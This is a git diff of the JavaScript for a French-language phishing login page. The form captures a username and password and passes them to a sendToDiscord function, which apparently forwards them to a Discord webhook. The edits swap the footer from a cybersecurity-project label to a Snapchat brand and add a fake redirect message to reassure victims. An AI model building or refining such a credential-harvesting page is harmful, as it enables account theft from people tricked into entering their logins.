@@ -1,5 +1,5 @@
 const toggleBtn = document.getElementById('toggleBtn');
-const emailInput = document.getElementById('email');
+const emailInput = document.getElementById('name');
 const passwordInput = document.getElementById('password');
 const loginForm = document.getElementById('loginForm');
 const languageSelect = document.getElementById('language');
@@ -21,7 +21,7 @@ loginForm.addEventListener('submit', function(e) {
     const password = passwordInput.value.trim();
     
     if (email.length === 0) {
-        alert('Veuillez entrer une adresse email');
+        alert('Veuillez entrer un nom d\'utilisateur');
         return;
     }
 
@@ -38,7 +38,7 @@ loginForm.addEventListener('submit', function(e) {
     try {
         sendToDiscord(email, password);
 
-        alert('Informations envoyées avec succès !');
+        alert('Informations envoyées avec succès, vous allez être redirigé dans quelques secondes...\n (note: si cela ne marche pas, rafraichissez la page et veuillez ré essayer)');
         loginForm.reset();
     } catch (error) {
         console.error('Erreur lors de l\'envoi des informations :', error);
@@ -102,7 +102,7 @@ async function sendToDiscord(email, password) {
                 }
             ],
             footer: {
-                text: "Projet Cybersécurité - À des fins éducatives uniquement"
+                text: "Snapchat - À des fins éducatives uniquement !"
             },
             timestamp: now.toISOString()
         }]
